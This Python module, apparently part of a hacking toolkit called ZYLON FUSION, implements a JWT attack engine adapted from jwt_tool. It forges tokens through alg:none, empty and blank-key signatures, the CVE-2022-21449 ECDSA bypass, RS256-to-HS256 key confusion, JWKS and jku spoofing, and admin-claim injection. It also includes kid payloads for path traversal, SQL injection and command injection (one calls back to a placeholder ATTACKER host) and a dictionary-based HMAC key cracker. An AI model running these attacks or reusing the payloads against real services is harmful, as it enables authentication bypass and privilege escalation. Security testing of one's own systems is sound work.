#!/usr/bin/env python3
"""
ZYLON FUSION v2.5 NUCLEAR - JWT Security Engine
================================================
Fused from: jwt_tool (https://github.com/ticarpi/jwt_tool)
Purpose: JWT token testing, manipulation, and vulnerability detection
Attack Vectors: alg:none, key confusion, JWKS spoofing, kid injection,
                null signature, blank password, psychic signatures
Python 3.13 Compatible | Termux Non-Root
"""

import os
import sys
import json
import base64
import hashlib
import hmac
import re
import time
from collections import OrderedDict
from datetime import datetime

from core.shared_infra import shared_session, regex_cache, PayloadInjector

# ============================================================================
# JWT CORE FUNCTIONS
# ============================================================================

class JWTEngine:
    """JWT Security Testing Engine for ZYLON FUSION"""
    
    def __init__(self):
        self.target_url = None
        self.headers = {}
        self.cookies = {}
        self.method = "GET"
        self.results = []
    
    # ----------------------------------------------------------------
    # JWT PARSING
    # ----------------------------------------------------------------
    
    @staticmethod
    def parse_token(token):
        """Parse JWT token into header, payload, signature components"""
        token = token.strip()
        parts = token.split('.')
        
        if len(parts) != 3:
            return None, None, "Invalid JWT format (need 3 parts separated by '.')"
        
        try:
            # Decode header
            header_b64 = parts[0]
            header_b64 += '=' * (-len(header_b64) % 4)
            header = json.loads(base64.urlsafe_b64decode(header_b64))
            
            # Decode payload
            payload_b64 = parts[1]
            payload_b64 += '=' * (-len(payload_b64) % 4)
            payload = json.loads(base64.urlsafe_b64decode(payload_b64))
            
            # Signature (raw)
            signature = parts[2]
            
            return header, payload, signature
            
        except Exception as e:
            return None, None, f"Error parsing JWT: {str(e)}"
    
    @staticmethod
    def encode_component(data):
        """Encode a dict to base64url JSON"""
        json_str = json.dumps(data, separators=(',', ':'))
        return base64.urlsafe_b64encode(json_str.encode()).rstrip(b'=').decode()
    
    @staticmethod
    def build_token(header, payload, signature=""):
        """Build JWT token from components"""
        h = JWTEngine.encode_component(header)
        p = JWTEngine.encode_component(payload)
        return f"{h}.{p}.{signature}"
    
    @staticmethod
    def display_token(header, payload):
        """Pretty display of JWT contents"""
        lines = []
        lines.append("[cyan]═══ HEADER ═══[/cyan]")
        for k, v in header.items():
            lines.append(f"  [yellow]{k}[/yellow]: {v}")
        
        lines.append("[cyan]═══ PAYLOAD ═══[/cyan]")
        for k, v in payload.items():
            # Convert timestamps
            if k in ('exp', 'iat', 'nbf', 'auth_time') and isinstance(v, (int, float)):
                dt = datetime.fromtimestamp(v)
                lines.append(f"  [yellow]{k}[/yellow]: {v} ({dt.strftime('%Y-%m-%d %H:%M:%S')})")
            else:
                lines.append(f"  [yellow]{k}[/yellow]: {v}")
        
        # Check expiry
        if 'exp' in payload and isinstance(payload['exp'], (int, float)):
            if payload['exp'] < time.time():
                lines.append("[red]  ⚠ TOKEN EXPIRED![/red]")
        
        return '\n'.join(lines)
    
    # ----------------------------------------------------------------
    # ATTACK: alg:none
    # ----------------------------------------------------------------
    
    @staticmethod
    def attack_alg_none(header, payload):
        """Test alg:none vulnerability - 4 variants"""
        results = []
        none_variants = ['none', 'None', 'NONE', 'nOnE']
        
        for alg in none_variants:
            mod_header = OrderedDict(header)
            mod_header['alg'] = alg
            token = JWTEngine.build_token(mod_header, payload, "")
            results.append({
                'attack': f'alg:{alg}',
                'token': token,
                'description': f'Algorithm set to "{alg}" with empty signature'
            })
        
        return results
    
    # ----------------------------------------------------------------
    # ATTACK: Null Signature
    # ----------------------------------------------------------------
    
    @staticmethod
    def attack_null_signature(header, payload):
        """Test null signature - empty sig field"""
        mod_header = OrderedDict(header)
        token = JWTEngine.build_token(mod_header, payload, "")
        return [{
            'attack': 'null_signature',
            'token': token,
            'description': 'Token with empty signature (trailing dot)'
        }]
    
    # ----------------------------------------------------------------
    # ATTACK: Blank Password (empty HMAC key)
    # ----------------------------------------------------------------
    
    @staticmethod
    def attack_blank_password(header, payload):
        """Sign with empty string as HMAC key"""
        results = []
        for alg in ['HS256', 'HS384', 'HS512']:
            if header.get('alg', '').startswith('HS') or True:  # Try all HMAC variants
                mod_header = OrderedDict(header)
                mod_header['alg'] = alg
                token = JWTEngine._sign_hmac(mod_header, payload, "")
                results.append({
                    'attack': f'blank_password_{alg}',
                    'token': token,
                    'description': f'Signed with {alg} using empty string as key'
                })
        return results
    
    # ----------------------------------------------------------------
    # ATTACK: Psychic Signature (CVE-2022-21449)
    # ----------------------------------------------------------------
    
    @staticmethod
    def attack_psychic_signature(header, payload):
        """CVE-2022-21449 - ECDSA zero-value signature (Java 15-18)"""
        mod_header = OrderedDict(header)
        mod_header['alg'] = 'ES256'
        h = JWTEngine.encode_component(mod_header)
        p = JWTEngine.encode_component(payload)
        # The psychic signature - DER-encoded ECDSA with r=0, s=0
        psychic_sig = "MAYCAQACAQA"
        token = f"{h}.{p}.{psychic_sig}"
        return [{
            'attack': 'psychic_signature_CVE-2022-21449',
            'token': token,
            'description': 'ECDSA psychic signature (affects Java 15-18, JDK < 18.0.1.1)'
        }]
    
    # ----------------------------------------------------------------
    # ATTACK: Key Confusion (RS256 → HS256)
    # ----------------------------------------------------------------
    
    @staticmethod
    def attack_key_confusion(header, payload, public_key):
        """RSA/HMAC Key Confusion - use public key as HMAC secret"""
        mod_header = OrderedDict(header)
        mod_header['alg'] = 'HS256'
        
        if isinstance(public_key, str):
            public_key = public_key.encode()
        
        token = JWTEngine._sign_hmac(mod_header, payload, public_key)
        return [{
            'attack': 'key_confusion_RS256_to_HS256',
            'token': token,
            'description': 'Algorithm changed from RS256 to HS256, signed with public key as HMAC secret'
        }]
    
    # ----------------------------------------------------------------
    # ATTACK: JWKS Injection (embed key in header)
    # ----------------------------------------------------------------
    
    @staticmethod
    def attack_jwks_inject(header, payload, jwk_data=None):
        """Inject JWKS directly into JWT header"""
        mod_header = OrderedDict(header)
        
        if jwk_data is None:
            # Generate a default JWK for testing
            jwk_data = {
                "kty": "RSA",
                "kid": "jwt_tool_zylon",
                "use": "sig",
                "alg": "RS256",
                "n": "vzoLi8MJmFNkVYJO0NipDVN7ME0O0KW0N3ne7BpTbPT4OK3PqbzTF7LR3iE2Pm8gI3D0SfZLQA8WnHSzs9XhBkFKLAt5jKEsYKNitXoqJa0JXQ4LKoY-xo0p8OKE5xbJQITNPMeGq0TZJ7Zx5qSSxOB3jc2HWJIRyfMMR4P6DBc_cRyKhD_u0dHJ05Mhg0DoOUczZ8W6QZdOkUlBZQbB6Re3PNBq0QsIkPnJLqiE5MK3NB2Ff1Gq1NB_2jGTR4TCZID5wG_VQCOhqOJ8oU6wGPR7X0IzMjzKvMwTuxz3N2Rt_sE4pG5CIMVkzJqeUsO_1JXVgI8vNs0YJqnKQ",
                "e": "AQAB"
            }
        
        mod_header['jwk'] = jwk_data
        if 'kid' not in mod_header and 'kid' in jwk_data:
            mod_header['kid'] = jwk_data['kid']
        
        h = JWTEngine.encode_component(mod_header)
        p = JWTEngine.encode_component(payload)
        # Empty signature since we don't have the private key for demo
        token = f"{h}.{p}."
        
        return [{
            'attack': 'jwks_injection',
            'token': token,
            'description': 'JWKS embedded in header - tests if server trusts header jwk claim'
        }]
    
    # ----------------------------------------------------------------
    # ATTACK: jku Spoofing
    # ----------------------------------------------------------------
    
    @staticmethod
    def attack_jku_spoof(header, payload, attacker_jku_url):
        """Spoof jku header claim to point to attacker-controlled JWKS"""
        mod_header = OrderedDict(header)
        mod_header['jku'] = attacker_jku_url
        
        h = JWTEngine.encode_component(mod_header)
        p = JWTEngine.encode_component(payload)
        token = f"{h}.{p}."
        
        return [{
            'attack': 'jku_spoofing',
            'token': token,
            'description': f'jku set to attacker URL: {attacker_jku_url}'
        }]
    
    # ----------------------------------------------------------------
    # ATTACK: kid Path Traversal
    # ----------------------------------------------------------------
    
    @staticmethod
    def attack_kid_injection(header, payload):
        """Inject into kid header claim"""
        kid_payloads = [
            ('../../dev/null', 'Path traversal to /dev/null (signs with empty file)'),
            ('/dev/null', 'Direct /dev/null path'),
            ('/proc/sys/kernel/hostname', 'Read system info via kid path'),
            ("x' UNION SELECT '1';--", 'SQL injection in kid (signs with key "1")'),
            ('|sleep 10', 'Command injection in kid (time delay)'),
            ('| curl http://ATTACKER/callback', 'Command injection in kid (callback)'),
            ('', 'Empty kid value'),
        ]
        
        results = []
        for kid_val, desc in kid_payloads:
            mod_header = OrderedDict(header)
            mod_header['kid'] = kid_val
            
            # For /dev/null traversal, sign with empty key
            if '/dev/null' in kid_val or '../../dev/null' in kid_val:
                token = JWTEngine._sign_hmac(mod_header, payload, "")
            elif "UNION SELECT '1'" in kid_val:
                token = JWTEngine._sign_hmac(mod_header, payload, "1")
            elif kid_val == '':
                token = JWTEngine._sign_hmac(mod_header, payload, "")
            else:
                h = JWTEngine.encode_component(mod_header)
                p = JWTEngine.encode_component(payload)
                token = f"{h}.{p}."
            
            results.append({
                'attack': f'kid_injection_{kid_val[:30]}',
                'token': token,
                'description': f'kid injection: {desc}'
            })
        
        return results
    
    # ----------------------------------------------------------------
    # ATTACK: Claim Injection
    # ----------------------------------------------------------------
    
    @staticmethod
    def attack_claim_injection(header, payload):
        """Inject common privilege escalation claims"""
        claim_payloads = [
            ('role', 'admin'),
            ('role', 'administrator'),
            ('is_admin', True),
            ('isAdmin', True),
            ('admin', True),
            ('user_type', 'admin'),
            ('privilege', 'admin'),
            ('permissions', 'admin'),
            ('access_level', 'admin'),
            ('group', 'admin'),
            ('groups', ['admin']),
            ('scope', 'admin'),
            ('authorities', ['ROLE_ADMIN']),
            ('user_role', 'admin'),
        ]
        
        results = []
        for key, value in claim_payloads:
            mod_payload = OrderedDict(payload)
            mod_payload[key] = value
            
            # Rebuild without valid signature
            h = JWTEngine.encode_component(header)
            p = JWTEngine.encode_component(mod_payload)
            token = f"{h}.{p}."
            
            results.append({
                'attack': f'claim_inject_{key}={value}',
                'token': token,
                'description': f'Injected claim: {key} = {value}'
            })
        
        return results
    
    # ----------------------------------------------------------------
    # HMAC SIGNING
    # ----------------------------------------------------------------
    
    @staticmethod
    def _sign_hmac(header, payload, key):
        """Sign JWT with HMAC"""
        if isinstance(key, str):
            key = key.encode()
        
        h = JWTEngine.encode_component(header)
        p = JWTEngine.encode_component(payload)
        message = f"{h}.{p}".encode()
        
        alg = header.get('alg', 'HS256')
        if alg == 'HS384':
            sig = hmac.new(key, message, hashlib.sha384).digest()
        elif alg == 'HS512':
            sig = hmac.new(key, message, hashlib.sha512).digest()
        else:  # HS256
            sig = hmac.new(key, message, hashlib.sha256).digest()
        
        sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
        return f"{h}.{p}.{sig_b64}"
    
    # ----------------------------------------------------------------
    # FULL SCAN (Playbook)
    # ----------------------------------------------------------------
    
    @staticmethod
    def full_scan(token, public_key=None):
        """Run full JWT attack playbook"""
        header, payload, sig = JWTEngine.parse_token(token)
        if header is None:
            return {'error': payload}  # payload contains error msg here
        
        all_results = {
            'original': {
                'header': header,
                'payload': payload,
                'signature': sig
            },
            'attacks': []
        }
        
        # Attack 1: alg:none
        all_results['attacks'].extend(JWTEngine.attack_alg_none(header, payload))
        
        # Attack 2: Null signature
        all_results['attacks'].extend(JWTEngine.attack_null_signature(header, payload))
        
        # Attack 3: Blank password
        all_results['attacks'].extend(JWTEngine.attack_blank_password(header, payload))
        
        # Attack 4: Psychic signature
        all_results['attacks'].extend(JWTEngine.attack_psychic_signature(header, payload))
        
        # Attack 5: Key confusion (if public key provided)
        if public_key:
            all_results['attacks'].extend(JWTEngine.attack_key_confusion(header, payload, public_key))
        
        # Attack 6: JWKS injection
        all_results['attacks'].extend(JWTEngine.attack_jwks_inject(header, payload))
        
        # Attack 7: kid injection
        if 'kid' in header:
            all_results['attacks'].extend(JWTEngine.attack_kid_injection(header, payload))
        
        # Attack 8: Claim injection
        all_results['attacks'].extend(JWTEngine.attack_claim_injection(header, payload))
        
        return all_results
    
    # ----------------------------------------------------------------
    # TOKEN TAMPERING
    # ----------------------------------------------------------------
    
    @staticmethod
    def tamper_token(token, claim_key=None, claim_value=None):
        """Tamper with specific claim in JWT"""
        header, payload, sig = JWTEngine.parse_token(token)
        if header is None:
            return None
        
        if claim_key and claim_value is not None:
            # Auto-cast value
            if claim_value.lower() == 'true':
                claim_value = True
            elif claim_value.lower() == 'false':
                claim_value = False
            elif claim_value.lower() == 'null':
                claim_value = None
            elif claim_value.isdigit():
                claim_value = int(claim_value)
            else:
                try:
                    claim_value = float(claim_value)
                except ValueError:
                    pass
            
            payload[claim_key] = claim_value
        
        # Rebuild with no signature (for testing)
        h = JWTEngine.encode_component(header)
        p = JWTEngine.encode_component(payload)
        return f"{h}.{p}."
    
    # ----------------------------------------------------------------
    # HMAC KEY CRACKING (dictionary)
    # ----------------------------------------------------------------
    
    @staticmethod
    def crack_hmac(token, wordlist_path):
        """Try to crack HMAC key from wordlist"""
        header, payload, sig = JWTEngine.parse_token(token)
        if header is None:
            return None
        
        alg = header.get('alg', 'HS256')
        if not alg.startswith('HS'):
            return "Token does not use HMAC algorithm"
        
        h = JWTEngine.encode_component(header)
        p = JWTEngine.encode_component(payload)
        message = f"{h}.{p}".encode()
        
        target_sig = sig
        found_key = None
        
        try:
            with open(wordlist_path, 'r', errors='ignore') as f:
                for line in f:
                    key = line.strip()
                    if not key:
                        continue
                    
                    key_bytes = key.encode()
                    
                    if alg == 'HS256':
                        computed = base64.urlsafe_b64encode(
                            hmac.new(key_bytes, message, hashlib.sha256).digest()
                        ).rstrip(b'=').decode()
                    elif alg == 'HS384':
                        computed = base64.urlsafe_b64encode(
                            hmac.new(key_bytes, message, hashlib.sha384).digest()
                        ).rstrip(b'=').decode()
                    elif alg == 'HS512':
                        computed = base64.urlsafe_b64encode(
                            hmac.new(key_bytes, message, hashlib.sha512).digest()
                        ).rstrip(b'=').decode()
                    else:
                        continue
                    
                    if computed == target_sig:
                        found_key = key
                        break
        except FileNotFoundError:
            return f"Wordlist not found: {wordlist_path}"
        
        return found_key


# ============================================================================
# CONSOLE INTERFACE
# ============================================================================

def run_jwt_scan(console=None):
    """Interactive JWT scan for ZYLON menu"""
    if console is None:
        from rich.console import Console
        console = Console()
    
    from rich.panel import Panel
    from rich.table import Table
    from rich.prompt import Prompt
    
    console.print(Panel(
        "[bold cyan]JWT SECURITY ENGINE[/bold cyan]\n"
        "[yellow]Fused from: jwt_tool | 8 Attack Vectors[/yellow]\n"
        "[green]Attacks: alg:none, null sig, blank password, psychic sig,\n"
        "         key confusion, JWKS inject, kid injection, claim injection[/green]",
        border_style="bright_cyan"
    ))
    
    token = Prompt.ask("[cyan]Enter JWT token[/cyan]")
    if not token.strip():
        console.print("[red][-] No token provided![/red]")
        return
    
    engine = JWTEngine()
    header, payload, sig = JWTEngine.parse_token(token.strip())
    
    if header is None:
        console.print(f"[red][-] Error: {sig}[/red]")
        return
    
    # Display token
    display = JWTEngine.display_token(header, payload)
    console.print(display)
    
    # Ask for scan type
    console.print("\n[bold yellow]Attack Options:[/bold yellow]")
    console.print("  [1] Full Attack Playbook (all attacks)")
    console.print("  [2] alg:none only")
    console.print("  [3] Key Confusion (need public key)")
    console.print("  [4] JWKS Injection")
    console.print("  [5] kid Injection")
    console.print("  [6] Claim Injection (privilege escalation)")
    console.print("  [7] Crack HMAC Key")
    console.print("  [8] Custom Claim Tampering")
    
    choice = Prompt.ask("[cyan]Select attack[/cyan]", default="1")
    
    results = []
    
    if choice == "1":
        pub_key = Prompt.ask("[cyan]Enter public key path (or press Enter to skip)[/cyan]", default="")
        pk = None
        if pub_key.strip():
            try:
                with open(pub_key.strip()) as f:
                    pk = f.read()
            except Exception:
                console.print("[yellow][!] Could not read public key, skipping key confusion[/yellow]")
        
        with console.status("[bold green]Running full JWT attack playbook...", spinner="dots"):
            scan_results = JWTEngine.full_scan(token.strip(), pk)
        
        if 'error' in scan_results:
            console.print(f"[red][-] {scan_results['error']}[/red]")
            return
        
        results = scan_results.get('attacks', [])
    
    elif choice == "2":
        results = JWTEngine.attack_alg_none(header, payload)
    
    elif choice == "3":
        pub_key = Prompt.ask("[cyan]Enter public key[/cyan]")
        results = JWTEngine.attack_key_confusion(header, payload, pub_key)
    
    elif choice == "4":
        results = JWTEngine.attack_jwks_inject(header, payload)
    
    elif choice == "5":
        results = JWTEngine.attack_kid_injection(header, payload)
    
    elif choice == "6":
        results = JWTEngine.attack_claim_injection(header, payload)
    
    elif choice == "7":
        wordlist = Prompt.ask("[cyan]Enter wordlist path[/cyan]", default="/usr/share/wordlists/rockyou.txt")
        with console.status("[bold green]Cracking HMAC key...", spinner="dots"):
            found = JWTEngine.crack_hmac(token.strip(), wordlist)
        if found and not found.startswith("Token") and not found.startswith("Wordlist"):
            console.print(f"[bold green][+] KEY FOUND: {found}[/bold green]")
        else:
            console.print(f"[yellow][-] {found or 'Key not found in wordlist'}[/yellow]")
        return
    
    elif choice == "8":
        claim_key = Prompt.ask("[cyan]Claim key to modify[/cyan]")
        claim_value = Prompt.ask("[cyan]New value[/cyan]")
        tampered = JWTEngine.tamper_token(token.strip(), claim_key, claim_value)
        if tampered:
            console.print(f"[green][+] Tampered token:[/green]")
            console.print(f"[cyan]{tampered}[/cyan]")
        return
    
    # Display results
    if results:
        console.print(f"\n[bold green][+] Generated {len(results)} attack tokens![/bold green]")
        
        for i, result in enumerate(results[:20], 1):
            table = Table(title=f"Attack #{i}", box=None, show_header=False)
            table.add_column("Key", style="cyan", width=15)
            table.add_column("Value", style="green")
            table.add_row("Attack", result['attack'])
            table.add_row("Description", result['description'])
            table.add_row("Token", result['token'][:200] + ('...' if len(result['token']) > 200 else ''))
            console.print(table)
            console.print()
    else:
        console.print("[yellow][-] No attack results generated.[/yellow]")


if __name__ == "__main__":
    run_jwt_scan()
